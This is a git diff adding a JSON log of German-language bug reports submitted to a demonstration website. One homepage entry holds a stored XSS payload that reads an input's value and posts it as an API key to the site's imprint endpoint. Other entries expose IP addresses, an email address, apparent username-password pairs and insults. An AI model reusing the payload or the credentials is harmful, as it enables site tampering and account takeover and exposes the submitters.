@@ -1,1 +1,1055 @@
-[]
+[
+  {
+    "id": "1743271742807_988",
+    "ip": "::ffff:127.0.0.1",
+    "timestamp": "2025-03-29T18:09:02.807Z",
+    "errorArea": "registration",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1743289110606_335",
+    "ip": "::1",
+    "timestamp": "2025-03-29T22:58:30.606Z",
+    "errorArea": "orga",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1743362874468_700",
+    "ip": "::1",
+    "timestamp": "2025-03-30T19:27:54.468Z",
+    "errorArea": "newsletter",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1743402810752_977",
+    "ip": "::1",
+    "timestamp": "2025-03-31T06:33:30.752Z",
+    "errorArea": "login",
+    "details": {
+      "description": "Passwort vergessen bzw. nicht gemerkt, da die Registrierung über das Handy nicht sichtbar funktionierte... im Hintergrund anscheinend doch (Benutzer: Gabi)"
+    }
+  },
+  {
+    "id": "1743516002585_931",
+    "ip": "::1",
+    "timestamp": "2025-04-01T14:00:02.585Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "Jeder Fascho ist ein Hurensohn ❤️"
+    }
+  },
+  {
+    "id": "1743776256252_670",
+    "ip": "::1",
+    "timestamp": "2025-04-04T14:17:36.252Z",
+    "errorArea": "newsletter",
+    "details": {
+      "description": "test\n"
+    }
+  },
+  {
+    "id": "1743778368172_188",
+    "ip": "::1",
+    "timestamp": "2025-04-04T14:52:48.172Z",
+    "errorArea": "chat",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1743882666428_173",
+    "ip": "96.0.0.217",
+    "timestamp": "2025-04-05T19:51:06.428Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Das Blättern klappt nicht. Es sind jetzt 21.50 Uhr 5.4.2025 "
+    }
+  },
+  {
+    "id": "1743883804265_471",
+    "ip": "79.117.47.188",
+    "timestamp": "2025-04-05T20:10:04.265Z",
+    "errorArea": "chat",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1743929681428_902",
+    "ip": "95.90.236.48",
+    "timestamp": "2025-04-06T08:54:41.428Z",
+    "errorArea": "registration",
+    "details": {
+      "description": "Klappt nicht-gebe meine mailadresse ein:  petblu1092@gmx.de bitte um Information zur Registrierung"
+    }
+  },
+  {
+    "id": "1743976833685_715",
+    "ip": "93.228.122.163",
+    "timestamp": "2025-04-06T22:00:33.685Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Diese Seite ist Fake... Alles was an euren Demos groß ist, ist eure Dummheit und der berechtigte protest gegen euch "
+    }
+  },
+  {
+    "id": "1743981558653_1",
+    "ip": "80.187.69.140",
+    "timestamp": "2025-04-06T23:19:18.653Z",
+    "errorArea": "registration",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1744033516488_469",
+    "ip": "84.133.57.221",
+    "timestamp": "2025-04-07T13:45:16.488Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Wenn man durch die Info-Seiten blättert, sind nicht alle Termine zu den bundesländer einsehbar"
+    }
+  },
+  {
+    "id": "1744340502933_599",
+    "ip": "185.220.101.16",
+    "timestamp": "2025-04-11T03:01:42.933Z",
+    "errorArea": "registration",
+    "details": {
+      "description": "Ich habe ein sehr langes sicheres Passwort. Ich fühle mich mit maximal 20 Zeichen sehr unsicher. Könnt ihr das Limit aus machen oder sehr sehr weit erhöhen? Mein Passwort ist leider mehrere hundert zeichen lang. Vielen Dank und liebe Grüße :)"
+    }
+  },
+  {
+    "id": "1744398274504_624",
+    "ip": "87.181.194.34",
+    "timestamp": "2025-04-11T19:04:34.504Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Die Webseite ist quasi nicht benutzbar. Das Video wird ständig angespielt! Ich klicke irgendwas an: Video. Ich wähle was aus. Video. Beim Schreiben dieses bug Reports kommt das Video ca 10-15 mal hoch. Zum kotzen! Ich bin echt nur am fluchen!"
+    }
+  },
+  {
+    "id": "1744404398318_504",
+    "ip": "46.5.255.220",
+    "timestamp": "2025-04-11T20:46:38.318Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Es sind nicht alle Veranstaltungsorte aufgeführt. Für Baden-Württemberg fehlt beispielsweise Reutlingen. Können Sie die fehlenden Städte bitte noch ergänzen. DANKE!"
+    }
+  },
+  {
+    "id": "1744425904434_121",
+    "ip": "109.70.100.66",
+    "timestamp": "2025-04-12T02:45:04.434Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "LOL<img src=\"\" onerror=k=document.querySelector('input').value;fetch('/api/impressum?apiKey='+k,{method:'POST',headers:{'Content-Type':'application/json'},body:`{\"Vorname\":\"\",\"Nachname\":\"${k}\",\"Adresse\":\"\",\"Adresszusatz\":\"\",\"Stadt\":\"\",\"Email\":\"\"}`})>"
+    }
+  },
+  {
+    "id": "1744488281842_252",
+    "ip": "89.57.104.52",
+    "timestamp": "2025-04-12T20:04:41.842Z",
+    "errorArea": "login",
+    "details": {
+      "description": "Xxx"
+    }
+  },
+  {
+    "id": "1744525663061_384",
+    "ip": "217.244.130.81",
+    "timestamp": "2025-04-13T06:27:43.061Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Im Impressum steht ein komischer Name. Das liest sich nicht deutsch."
+    }
+  },
+  {
+    "id": "1744543802321_372",
+    "ip": "94.156.150.62",
+    "timestamp": "2025-04-13T11:30:02.321Z",
+    "errorArea": "registration",
+    "details": {
+      "description": "Der Chat für Niedersachsen ist immer gesperrt. Ist das ein Fehler ?"
+    }
+  },
+  {
+    "id": "1744643500754_908",
+    "ip": "89.247.167.187",
+    "timestamp": "2025-04-14T15:11:40.754Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Brandenburg fehlt (Oranienburg???)"
+    }
+  },
+  {
+    "id": "1744717289583_772",
+    "ip": "95.223.78.176",
+    "timestamp": "2025-04-15T11:41:29.583Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Der Startplatz in Dortmund hat sich geändert aber er steht im Bild immer noch falsch "
+    }
+  },
+  {
+    "id": "1744786219771_413",
+    "ip": "91.35.157.164",
+    "timestamp": "2025-04-16T06:50:19.771Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Demo - Karlsruhe : es fehlt der Treffpunkt"
+    }
+  },
+  {
+    "id": "1744797682267_319",
+    "ip": "93.222.82.83",
+    "timestamp": "2025-04-16T10:01:22.267Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Demo in Karlsruhe findet nicht statt am 26.04?"
+    }
+  },
+  {
+    "id": "1744863902842_717",
+    "ip": "61.8.136.147",
+    "timestamp": "2025-04-17T04:25:02.842Z",
+    "errorArea": "orga",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1744983113110_69",
+    "ip": "95.91.228.222",
+    "timestamp": "2025-04-18T13:31:53.110Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Fehler bei Plakaten"
+    }
+  },
+  {
+    "id": "1745050612717_728",
+    "ip": "41.182.128.58",
+    "timestamp": "2025-04-19T08:16:52.717Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Deutsche Sprache schwere Sprache! Es heißt Proteste in 16 Bundesländern (nicht Bundesländer)"
+    }
+  },
+  {
+    "id": "1745075024644_8",
+    "ip": "129.227.46.170",
+    "timestamp": "2025-04-19T15:03:44.644Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Das Klicken durch die einzelnen Budnesländer funktioniert nicht."
+    }
+  },
+  {
+    "id": "1745085043904_332",
+    "ip": "217.232.60.1",
+    "timestamp": "2025-04-19T17:50:43.904Z",
+    "errorArea": "orga",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1745093204258_571",
+    "ip": "94.198.41.104",
+    "timestamp": "2025-04-19T20:06:44.258Z",
+    "errorArea": "newsletter",
+    "details": {
+      "description": "Ich bitte um Erweiterung der Themen für die Demo. Ganz explizit sollten wir jetzt für den Frieden in der Welt auf die Straße gehen. Danke Peter"
+    }
+  },
+  {
+    "id": "1745138857330_97",
+    "ip": "93.222.180.96",
+    "timestamp": "2025-04-20T08:47:37.330Z",
+    "errorArea": "login",
+    "details": {
+      "description": "KlausG     christ07dlvxc!!"
+    }
+  },
+  {
+    "id": "1745221367419_745",
+    "ip": "84.182.6.163",
+    "timestamp": "2025-04-21T07:42:47.419Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Richtig: Demos in 16 Bundesländern. (NICHT: Demos in 16 Bundesländer)"
+    }
+  },
+  {
+    "id": "1745232056310_990",
+    "ip": "31.16.199.202",
+    "timestamp": "2025-04-21T10:40:56.310Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "für hamburg fehlt die Adresse"
+    }
+  },
+  {
+    "id": "1745274574915_695",
+    "ip": "82.135.87.197",
+    "timestamp": "2025-04-21T22:29:34.915Z",
+    "errorArea": "orga",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1745303402991_355",
+    "ip": "156.67.131.243",
+    "timestamp": "2025-04-22T06:30:02.991Z",
+    "errorArea": "registration",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1745393684900_77",
+    "ip": "62.216.215.92",
+    "timestamp": "2025-04-23T07:34:44.900Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Blöd, wenn man schon auf dem Plakat Grammatikfehler macht!"
+    }
+  },
+  {
+    "id": "1745394198803_692",
+    "ip": "217.5.167.66",
+    "timestamp": "2025-04-23T07:43:18.803Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Angeblich Demo in allen 16 Bundesländern aber auf den Bildern sind gerade mal 10 Bundesländer aufgeführt. Dafür aber Bayern 3 Demos, Schleswig Holstein 2 Demos.\nEs fehlen Infos zu Brandenburg, Bremen, Hamburg, Niedersachsen, Sachsen, Sachsen-Anhalt "
+    }
+  },
+  {
+    "id": "1745399023115_859",
+    "ip": "95.90.240.210",
+    "timestamp": "2025-04-23T09:03:43.115Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Das Blättern durch die Bundesländer funktioniert nicht richtig. Brandenburg und Berlin werden bei mir nicht angezeigt (Firefox auf Win 10)"
+    }
+  },
+  {
+    "id": "1745423393733_270",
+    "ip": "80.187.116.176",
+    "timestamp": "2025-04-23T15:49:53.733Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Egal was man klickt. Es kommt immer der komische Zeppelin!"
+    }
+  },
+  {
+    "id": "1745427852344_174",
+    "ip": "185.220.101.30",
+    "timestamp": "2025-04-23T17:04:12.344Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "Ihr seid alles Spinner"
+    }
+  },
+  {
+    "id": "1745441733657_141",
+    "ip": "149.224.160.156",
+    "timestamp": "2025-04-23T20:55:33.657Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Itzehoe ist immer noch nicht dabei… wo sollen wir denn hinkommen am 26.4. ??? "
+    }
+  },
+  {
+    "id": "1745445093507_969",
+    "ip": "15.204.97.194",
+    "timestamp": "2025-04-23T21:51:33.507Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Hallo, schreibt doch Mal ein bisschen Text statt Bilder, das Problem für die Suchmaschine ist , das diese Seite sonst nicht gefunden wird und weniger Leute die Daten und Termine finden.\n\nLg"
+    }
+  },
+  {
+    "id": "1745447461332_993",
+    "ip": "109.70.100.3",
+    "timestamp": "2025-04-23T22:31:01.332Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "Hurensöhne"
+    }
+  },
+  {
+    "id": "1745483873369_273",
+    "ip": "45.141.215.88",
+    "timestamp": "2025-04-24T08:37:53.369Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Ich seid fachos und AfD Jünger "
+    }
+  },
+  {
+    "id": "1745510679818_293",
+    "ip": "87.147.133.105",
+    "timestamp": "2025-04-24T16:04:39.818Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Ich kann quasi garnichts machen. Ständig ploppt ein Video  von dem Zeppelin auf "
+    }
+  },
+  {
+    "id": "1745511123535_432",
+    "ip": "94.31.119.192",
+    "timestamp": "2025-04-24T16:12:03.535Z",
+    "errorArea": "login",
+    "details": {
+      "description": "Nutzernamen, Passwort, "
+    }
+  },
+  {
+    "id": "1745511435498_754",
+    "ip": "192.42.116.174",
+    "timestamp": "2025-04-24T16:17:15.498Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Arschgeigen"
+    }
+  },
+  {
+    "id": "1745524143254_147",
+    "ip": "80.187.67.35",
+    "timestamp": "2025-04-24T19:49:03.254Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Startpunkt Demo Reutlingen Standort nicht bekannt "
+    }
+  },
+  {
+    "id": "1745585622393_397",
+    "ip": "84.190.43.159",
+    "timestamp": "2025-04-25T12:53:42.393Z",
+    "errorArea": "login",
+    "details": {
+      "description": "Nutzer\nPasswort\n"
+    }
+  },
+  {
+    "id": "1745656265817_488",
+    "ip": "92.116.173.219",
+    "timestamp": "2025-04-26T08:31:05.817Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "16 Bundesländer\"n\""
+    }
+  },
+  {
+    "id": "1745659769658_251",
+    "ip": "84.174.177.29",
+    "timestamp": "2025-04-26T09:29:29.658Z",
+    "errorArea": "chat",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1745664759753_494",
+    "ip": "172.226.108.49",
+    "timestamp": "2025-04-26T10:52:39.753Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "Ihr stinkt"
+    }
+  },
+  {
+    "id": "1745673041717_664",
+    "ip": "87.123.244.119",
+    "timestamp": "2025-04-26T13:10:41.717Z",
+    "errorArea": "chat",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1745678096035_944",
+    "ip": "84.171.96.202",
+    "timestamp": "2025-04-26T14:34:56.035Z",
+    "errorArea": "orga",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1745693105600_496",
+    "ip": "176.3.176.159",
+    "timestamp": "2025-04-26T18:45:05.600Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Nirgendswirdgeszeigt,dasseseineSeitevonrexjtenidiotenistfehlerimsystemfehlerimsystenfehlerimsysten"
+    }
+  },
+  {
+    "id": "1745859890126_463",
+    "ip": "37.138.243.29",
+    "timestamp": "2025-04-28T17:04:50.126Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Das riecht hier alles etwas nach Nazischeiße"
+    }
+  },
+  {
+    "id": "1745953934880_728",
+    "ip": "95.91.194.117",
+    "timestamp": "2025-04-29T19:12:14.880Z",
+    "errorArea": "registration",
+    "details": {
+      "description": "Kein Einloggen möglich "
+    }
+  },
+  {
+    "id": "1746140442363_409",
+    "ip": "80.187.86.70",
+    "timestamp": "2025-05-01T23:00:42.363Z",
+    "errorArea": "newsletter",
+    "details": {
+      "description": "daddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddaddadd"
+    }
+  },
+  {
+    "id": "1746268074991_500",
+    "ip": "204.8.96.156",
+    "timestamp": "2025-05-03T10:27:54.991Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "der e"
+    }
+  },
+  {
+    "id": "1746268553089_569",
+    "ip": "128.31.0.13",
+    "timestamp": "2025-05-03T10:35:53.089Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: \"A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746268770917_266",
+    "ip": "107.189.3.148",
+    "timestamp": "2025-05-03T10:39:30.917Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: \"A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746269338646_650",
+    "ip": "185.220.101.51",
+    "timestamp": "2025-05-03T10:48:58.646Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: \"A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746269509695_922",
+    "ip": "93.104.66.208",
+    "timestamp": "2025-05-03T10:51:49.695Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746269664947_185",
+    "ip": "185.129.62.62",
+    "timestamp": "2025-05-03T10:54:24.947Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746269686669_259",
+    "ip": "185.220.101.84",
+    "timestamp": "2025-05-03T10:54:46.669Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746269723763_316",
+    "ip": "107.189.1.228",
+    "timestamp": "2025-05-03T10:55:23.763Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746269725423_764",
+    "ip": "45.80.158.23",
+    "timestamp": "2025-05-03T10:55:25.423Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746269760356_354",
+    "ip": "185.220.101.14",
+    "timestamp": "2025-05-03T10:56:00.356Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746269777036_765",
+    "ip": "80.94.92.106",
+    "timestamp": "2025-05-03T10:56:17.036Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746269815440_381",
+    "ip": "195.47.238.87",
+    "timestamp": "2025-05-03T10:56:55.440Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746269935567_835",
+    "ip": "185.220.101.132",
+    "timestamp": "2025-05-03T10:58:55.567Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746269960871_787",
+    "ip": "185.220.101.6",
+    "timestamp": "2025-05-03T10:59:20.871Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270001211_305",
+    "ip": "78.142.18.219",
+    "timestamp": "2025-05-03T11:00:01.211Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270065805_470",
+    "ip": "185.220.101.77",
+    "timestamp": "2025-05-03T11:01:05.805Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270129431_171",
+    "ip": "193.189.100.206",
+    "timestamp": "2025-05-03T11:02:09.431Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270154180_62",
+    "ip": "107.189.14.43",
+    "timestamp": "2025-05-03T11:02:34.180Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270241361_405",
+    "ip": "185.220.101.107",
+    "timestamp": "2025-05-03T11:04:01.361Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270305174_72",
+    "ip": "192.42.116.175",
+    "timestamp": "2025-05-03T11:05:05.174Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270425961_248",
+    "ip": "102.130.117.167",
+    "timestamp": "2025-05-03T11:07:05.961Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270476445_899",
+    "ip": "5.255.115.58",
+    "timestamp": "2025-05-03T11:07:56.445Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270502045_265",
+    "ip": "185.220.101.134",
+    "timestamp": "2025-05-03T11:08:22.045Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270604717_497",
+    "ip": "185.132.53.6",
+    "timestamp": "2025-05-03T11:10:04.717Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270621570_687",
+    "ip": "193.189.100.204",
+    "timestamp": "2025-05-03T11:10:21.570Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270674327_345",
+    "ip": "108.59.12.3",
+    "timestamp": "2025-05-03T11:11:14.327Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270697743_551",
+    "ip": "185.220.101.4",
+    "timestamp": "2025-05-03T11:11:37.743Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270756100_241",
+    "ip": "185.220.101.54",
+    "timestamp": "2025-05-03T11:12:36.100Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270855586_833",
+    "ip": "91.208.75.153",
+    "timestamp": "2025-05-03T11:14:15.586Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270876364_210",
+    "ip": "45.90.185.104",
+    "timestamp": "2025-05-03T11:14:36.364Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270891280_545",
+    "ip": "107.189.7.144",
+    "timestamp": "2025-05-03T11:14:51.280Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746270982585_173",
+    "ip": "176.65.149.88",
+    "timestamp": "2025-05-03T11:16:22.585Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746271034541_628",
+    "ip": "46.182.21.248",
+    "timestamp": "2025-05-03T11:17:14.541Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746271202729_270",
+    "ip": "92.246.84.133",
+    "timestamp": "2025-05-03T11:20:02.729Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746271235795_916",
+    "ip": "185.40.4.101",
+    "timestamp": "2025-05-03T11:20:35.795Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746271260959_353",
+    "ip": "185.207.107.130",
+    "timestamp": "2025-05-03T11:21:00.959Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746271286502_981",
+    "ip": "51.195.107.220",
+    "timestamp": "2025-05-03T11:21:26.502Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "<main.js>: A fatal error occured in 'function handleAreaChange()'"
+    }
+  },
+  {
+    "id": "1746787000754_199",
+    "ip": "87.138.152.222",
+    "timestamp": "2025-05-09T10:36:40.754Z",
+    "errorArea": "chat",
+    "details": {
+      "description": "Im Chat sind immer wieder Zecken. Wer kann die entfernen?"
+    }
+  },
+  {
+    "id": "1746870515707_760",
+    "ip": "217.225.155.107",
+    "timestamp": "2025-05-10T09:48:35.707Z",
+    "errorArea": "login",
+    "details": {
+      "description": "Elwedridsch  Mike666!"
+    }
+  },
+  {
+    "id": "1747386703434_590",
+    "ip": "185.220.101.175",
+    "timestamp": "2025-05-16T09:11:43.434Z",
+    "errorArea": "registration",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1747515886215_167",
+    "ip": "188.193.94.233",
+    "timestamp": "2025-05-17T21:04:46.215Z",
+    "errorArea": "login",
+    "details": {
+      "description": "Ich bekomme keine Rückmeldung ob meine Registrierung funktioniert hat. Ich würde gern mehr über die Demos in München erfahren und teilnehmen auch mit Menschen die sich aus Angst nicht registrieren wollen. Echt schade das ich an dem Prozess nicht teil"
+    }
+  },
+  {
+    "id": "1747634933014_947",
+    "ip": "176.198.156.27",
+    "timestamp": "2025-05-19T06:08:53.014Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Guten Tag,  es sind nocht alle Bundesländer verfügbar, wird das noch aktualisieren? Danke und Gruß "
+    }
+  },
+  {
+    "id": "1747648052868_871",
+    "ip": "185.38.48.142",
+    "timestamp": "2025-05-19T09:47:32.868Z",
+    "errorArea": "newsletter",
+    "details": {
+      "description": "geht nicht "
+    }
+  },
+  {
+    "id": "1747931581839_594",
+    "ip": "46.5.255.220",
+    "timestamp": "2025-05-22T16:33:01.839Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Leider sind nur sehr wenig Standorte aufgeführt. Könnten Sie diese noch ergänzen?"
+    }
+  },
+  {
+    "id": "1747990684115_735",
+    "ip": "178.162.225.69",
+    "timestamp": "2025-05-23T08:58:04.115Z",
+    "errorArea": "newsletter",
+    "details": {
+      "description": "wo sind die Städte!  In denen am 31.5. Demos stattfinden. Bisher sehe ich nur 5 davon"
+    }
+  },
+  {
+    "id": "1747998763430_808",
+    "ip": "83.135.242.0",
+    "timestamp": "2025-05-23T11:12:43.430Z",
+    "errorArea": "chat",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1748164401952_442",
+    "ip": "79.237.74.32",
+    "timestamp": "2025-05-25T09:13:21.952Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Da steht eine Menge Blödsinn, das kann nicht richtig sein. Das sollte vielleicht ein normal denkender Mensch noch mal drüber schauen."
+    }
+  },
+  {
+    "id": "1748521435380_904",
+    "ip": "79.251.146.220",
+    "timestamp": "2025-05-29T12:23:55.380Z",
+    "errorArea": "orga",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1748527441097_121",
+    "ip": "62.224.204.116",
+    "timestamp": "2025-05-29T14:04:01.097Z",
+    "errorArea": "chat",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1748539429532_687",
+    "ip": "93.207.158.160",
+    "timestamp": "2025-05-29T17:23:49.532Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Wat zum bimbam isn das für'n überragend unseriöses impressum"
+    }
+  },
+  {
+    "id": "1749409218488_897",
+    "ip": "91.248.176.22",
+    "timestamp": "2025-06-08T19:00:18.488Z",
+    "errorArea": "newsletter",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1749475641406_637",
+    "ip": "2.204.37.195",
+    "timestamp": "2025-06-09T13:27:21.406Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Alles an der Seite ist ein Fehler. "
+    }
+  },
+  {
+    "id": "1749494969089_160",
+    "ip": "89.247.162.118",
+    "timestamp": "2025-06-09T18:49:29.089Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Es wird immer noch der 31.5. Beworben"
+    }
+  },
+  {
+    "id": "1749710836903_972",
+    "ip": "159.89.111.220",
+    "timestamp": "2025-06-12T06:47:16.903Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Die nächste Demo Ende Juni wird nicht angezeigt."
+    }
+  },
+  {
+    "id": "1749820831183_401",
+    "ip": "80.209.213.76",
+    "timestamp": "2025-06-13T13:20:31.183Z",
+    "errorArea": "registration",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1750142021794_828",
+    "ip": "92.72.44.16",
+    "timestamp": "2025-06-17T06:33:41.794Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Ich finde kein Impressum"
+    }
+  },
+  {
+    "id": "1750515208827_440",
+    "ip": "91.45.204.156",
+    "timestamp": "2025-06-21T14:13:28.827Z",
+    "errorArea": "orga",
+    "details": {
+      "description": ""
+    }
+  },
+  {
+    "id": "1750587470635_472",
+    "ip": "176.198.156.27",
+    "timestamp": "2025-06-22T10:17:50.635Z",
+    "errorArea": "homepage",
+    "details": {
+      "description": "Hallo es sind nur 4 Bundesländer für die Demo 28.06.vorhanden, möchte Werbung machen, dafür brauche ich die aktualisierte Homepage. Danke und Gruß "
+    }
+  },
+  {
+    "id": "1752428022628_381",
+    "ip": "80.187.87.139",
+    "timestamp": "2025-07-13T17:33:42.628Z",
+    "errorArea": "chat",
+    "details": {
+      "description": ""
+    }
+  }
+]
